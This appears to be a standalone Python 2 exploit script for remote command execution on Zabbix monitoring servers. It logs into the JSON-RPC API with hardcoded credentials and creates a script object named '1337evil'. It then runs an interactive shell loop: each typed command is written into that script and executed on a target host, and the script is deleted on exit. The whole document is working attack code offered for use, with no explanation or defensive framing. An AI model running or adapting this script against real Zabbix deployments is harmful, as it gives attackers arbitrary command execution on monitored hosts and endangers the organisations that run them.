#!/usr/bin/env python
# Zabbix API RCE

import requests
import json
import readline

url  = 'http://192.168.101.10/zabbix'    # base url
url += '/api_jsonrpc.php'               # endpoint 

username = 'zapper'         # username
password = 'zapper'         # password
hostid = '10001'            # must have write permissions to host
scriptname = '1337evil'     # w/e you wanna name it

headers = { 'content-type': 'application/json' }

def send_request(json_data):
    res = requests.post(url, data=json.dumps(json_data), headers=(headers))
    return res.json();

def logout(session):
    req = {
        "jsonrpc": "2.0",
        "method": "user.logout",
        "params": [],
        "id": 1,
        "auth": session
    }
    
    res = send_request(req)

    if (res.has_key("result") and res["result"] == True):
        print "[>] logged out of session"
    else:
        print "[!] unable to log out of session: "
        print res

def login():
    req = {
        "jsonrpc" : "2.0",
        "method" : "user.login",
        "params": {
            'user': username,
            'password': password,
        },
        "auth" : None,
        "id" : 0,
    }
    
    res = send_request(req)

    if res.has_key("result"):
        print "[>] Successful login"
        return res["result"]
    else:
        print "[!] unable to authenticate"
        print res
        exit();

def create(session):
    req = {
        "jsonrpc": "2.0",
        "method": "script.create",
        "params": {
            "name": scriptname,
            "command": "echo hello",
            "host_access": 3, # 2 = read, 3 = write
        },
        "auth": session,
        "id": 1
    }

    res = send_request(req)
    if res.has_key("result") and res["result"].has_key("scriptids"):
        return res["result"]["scriptids"][0]
    else:
        if "already exists." in res["error"]["data"]:
            print "[>] script already exists, getting the id"
            return lookup(session)
        else:
            print "[!] could not lock a script" 
            print res

def lookup(session):
    req = {
        "jsonrpc": "2.0",
        "method": "script.get",
        "params": {
            "output": "extend",
            "search": {
            "name":scriptname,
            }
        },
        "auth": session,
        "id": 1
    }
    res = send_request(req)
    if res.has_key("result"):
        return res["result"][0]["scriptid"]
    else:
        return ""

def delete(session, scriptid):
    req = {
        "jsonrpc": "2.0",
        "method": "script.delete",
        "params": [
            scriptid
        ],
        "auth": session,
        "id": 1
    }
    res = send_request(req)
    if res.has_key("result") and res["result"].has_key("scriptids"):
        if res["result"]["scriptids"][0] == scriptid:
            print "[>] script successfully deleted"
            return True

    print "[!] Unable to delete script:"
    print res

def update(session, scriptid, cmd):
    req = {
        "jsonrpc": "2.0",
        "method": "script.update",
        "params": {
            "scriptid": scriptid,
            "command": cmd
        },
        "auth" : session,
        "id" : 0,
    }

    res = send_request(req)

def execute(session, scriptid):
    req = {
        "jsonrpc": "2.0",
        "method": "script.execute",
        "params": {
            "scriptid": scriptid,
            "hostid": hostid
        },
        "auth" : session,
        "id" : 0,
    }
    res = send_request(req)
    return res


session = login()
scriptid = create(session)

print "[#] script id: " + scriptid

while True:
    cmd = raw_input('\033[41m[zabbix_cmd]>>: \033[0m ')
    if cmd == "exit":
        break
    else:
        update(session, scriptid, cmd)
        output = execute(session, scriptid)
        if output.has_key("result"):
            print output["result"]["value"]
        else:
            print output

delete(session, scriptid)
logout(session)
exit()